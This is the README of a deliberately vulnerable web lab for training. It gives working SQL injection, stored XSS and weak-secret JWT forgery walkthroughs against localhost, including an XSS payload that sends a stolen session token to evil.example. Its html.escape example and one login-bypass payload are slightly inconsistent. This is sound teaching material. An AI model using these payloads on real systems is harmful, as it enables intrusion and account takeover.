# VulnLab - Cybersecurity Training Lab

## PROJECT OVERVIEW

**VulnLab** is a deliberately vulnerable web application designed for cybersecurity training and penetration testing practice. It demonstrates common web vulnerabilities (SQL Injection, XSS, JWT Auth Bypass) in a safe, controlled environment.

> **⚠️ WARNING: FOR EDUCATIONAL USE ONLY**  
> This application contains intentional security flaws. Do not deploy on public infrastructure or production systems.

### Tech Stack

| Component  | Technology   | Port  |
| ---------- | ------------ | ----- |
| Backend    | Python Flask | 8001  |
| Database   | SQLite       | Local |
| Frontend   | HTML/CSS/JS  | 8000  |
| Auth       | JWT (PyJWT)  | -     |
| Deployment | Docker       | -     |

## QUICK START

### Docker (Recommended)

```bash
# Build and run
docker build -t vulnlab .
docker run -p 8000:8000 -p 8001:8001 vulnlab
```

Frontend: http://localhost:8000  
API: http://localhost:8001

### Local Development

```bash
cd backend
pip install -r requirements.txt
python app.py  # Backend on http://localhost:8001
```

New terminal:

```bash
cd frontend
python -m http.server 8000  # Frontend on http://localhost:8000
```

Open http://localhost:8000 in browser.

## DEFAULT CREDENTIALS

| Username | Password    |
| -------- | ----------- |
| alice    | password123 |
| bob      | hunter2     |
| admin    | sup3rs3cr3t |

## API REFERENCE

| Method | Path              | Auth Required | Description               |
| ------ | ----------------- | ------------- | ------------------------- |
| GET    | /health           | No            | Status + vuln flag states |
| POST   | /login            | No            | Login, returns JWT token  |
| GET    | /search?q=        | Yes           | Search products           |
| GET    | /comments         | Yes           | Get all comments          |
| POST   | /comment          | Yes           | Post new comment          |
| POST   | /flags/activate   | Secret        | Enable vuln flag          |
| POST   | /flags/deactivate | Secret        | Disable vuln flag         |

## FEATURE FLAGS — HOW TO USE

Flags stored in `VULNS = {"sqli": False, "xss": False, "auth_bypass": False}`

**Check state:**

```bash
curl http://localhost:8001/health
```

**Activate flag:**

```bash
curl -X POST http://localhost:8001/flags/activate \
  -H 'Content-Type: application/json' \
  -d '{"secret": "admin-secret", "vuln": "sqli"}'
```

**Deactivate flag:**

```bash
curl -X POST http://localhost:8001/flags/deactivate \
  -H 'Content-Type: application/json' \
  -d '{"secret": "admin-secret", "vuln": "sqli"}'
```

Wrong secret → `403 {"error": "Forbidden: incorrect secret"}`

## VULNERABILITY 1 — SQL INJECTION

**SQL Injection (SQLi)** occurs when untrusted user input is concatenated directly into SQL queries, allowing attackers to manipulate the query logic.

**Activate:**

```bash
curl -X POST http://localhost:8001/flags/activate -H 'Content-Type: application/json' -d '{"secret": "admin-secret", "vuln": "sqli"}'
```

### Attack 1: Login Bypass

Injected query: `SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'`

```bash
curl -X POST http://localhost:8001/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin\"--", "password": "anything"}'
```

Expected: `{"token": "...", "username": "admin"}`

### Attack 2: UNION Data Extraction on /search

Extracts users from `users` table via UNION:

```bash
TOKEN=$(curl -s -X POST http://localhost:8001/login -H 'Content-Type: application/json' -d '{"username": "alice", "password": "password123"}' | jq -r .token)
curl -H "Authorization: Bearer $TOKEN" 'http://localhost:8001/search?q=-)+UNION+SELECT+id%2Cusername%2Cpassword+FROM+users--'
```

Expected: Products + user rows like `{"id":1,"username":"alice","password":"password123"}`

**Safe mode verification (sqli OFF):**
Same commands return normal results or no match (parameterized queries block injection).

**Parameterized queries** use `?` placeholders + bind values, preventing injection by treating input as data, not code.

## VULNERABILITY 2 — CROSS-SITE SCRIPTING (XSS)

**Stored XSS** saves malicious script in DB, executes for all viewers (persistent).

**Activate:**

```bash
curl -X POST http://localhost:8001/flags/activate -H 'Content-Type: application/json' -d '{"secret": "admin-secret", "vuln": "xss"}'
```

### Attack 1: Basic Alert (via curl + browser)

Post:

```bash
TOKEN=$(curl -s -X POST http://localhost:8001/login -H 'Content-Type: application/json' -d '{"username": "alice", "password": "password123"}' | jq -r .token)
curl -X POST http://localhost:8001/comment \
  -H 'Authorization: Bearer '$TOKEN'' \
  -H 'Content-Type: application/json' \
  -d '{"author": "hacker", "body": "<img src=x onerror=\"alert('\''XSS!'\'')\">"}'
```

Open http://localhost:8000/comments.html → **alert('XSS!')** pops.

**Why no `<script>`?** Browsers block `innerHTML`-injected `<script>` tags (security policy).

### Attack 2: JWT Token Theft Simulation

Body: `<img src=x onerror="alert(localStorage.getItem('vulnlab_token'))">`
Steals JWT from victim's localStorage.

### Attack 3: Redirect Simulation

Body: `<img src=x onerror="window.location='https://evil.example/?t='+localStorage.getItem('vulnlab_token')">`
**Impact:** Steals session → account takeover.

**Safe mode:** `curl -H "Authorization: Bearer $TOKEN" http://localhost:8001/comments` → `<img...>` (escaped).

**html.escape()** converts `<`→`<`, `>`→`>` → treats as text.

## VULNERABILITY 3 — AUTH BYPASS (WEAK JWT SECRET)

**JWT** (JSON Web Token) signs claims with secret. Anyone with secret forges tokens.

**Activate:**

```bash
curl -X POST http://localhost:8001/flags/activate -H 'Content-Type: application/json' -d '{"secret": "admin-secret", "vuln": "auth_bypass"}'
```

**Attack Steps:**

1. **Health check:**

   ```bash
   curl http://localhost:8001/health
   ```

2. **Normal login:**

   ```bash
   REAL_TOKEN=$(curl -s -X POST http://localhost:8001/login -H 'Content-Type: application/json' -d '{"username": "alice", "password": "password123"}' | jq -r .token)
   ```

3. **Forge admin token:**

   ```python
   # python3 one-liner
   python3 -c 'import jwt; print(jwt.encode({"sub": "admin"}, "secret", algorithm="HS256"))'
   ```

   Output: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE`

4. **Test forged OFF:** `curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:8001/search?q=test` → 401

5. **Activate bypass** (Step above)

6. **Test forged ON:** Same curl → 200 (accepted!)

7. **Deactivate:** `/flags/deactivate`

Strong secret rotates regularly/strong; weak easy to guess/brute.

**Safe mode:** Forged token → `401 Invalid token`.

## TESTING CHECKLIST

| Vulnerability | Test                  | Flag State | Expected Result               |
| ------------- | --------------------- | ---------- | ----------------------------- |
| SQLi          | Login bypass          | ON         | Admin login succeeds          |
| SQLi          | Login bypass          | OFF        | 401 Invalid credentials       |
| SQLi          | UNION users dump      | ON         | User data in results          |
| SQLi          | UNION users dump      | OFF        | Normal products only          |
| XSS           | Payload executes      | ON         | alert() pops in comments.html |
| XSS           | Payload executes      | OFF        | Escaped text (<img>)          |
| Auth Bypass   | Forged token accepted | ON         | 200 on protected endpoint     |
| Auth Bypass   | Forged token accepted | OFF        | 401 Invalid token             |
| Auth          | No token              | Any        | 401 everywhere                |
| Flags         | Wrong secret          | Any        | 403 Forbidden                 |

## LEARNING OBJECTIVES

Students will learn **SQL Injection**: Understand input sanitization, recognize unsafe concatenation vs parameterized queries. **Impact:** Data theft, bypass, DB takeover.

**XSS**: Grasp client-side execution context, stored vs reflected. **Impact:** Session hijacking, defacement, keylogging.

**JWT Auth Bypass**: Secret management best practices. **Impact:** Full account impersonation.

## DISCLAIMER

For educational use only. Do not deploy publicly. Report issues responsibly.
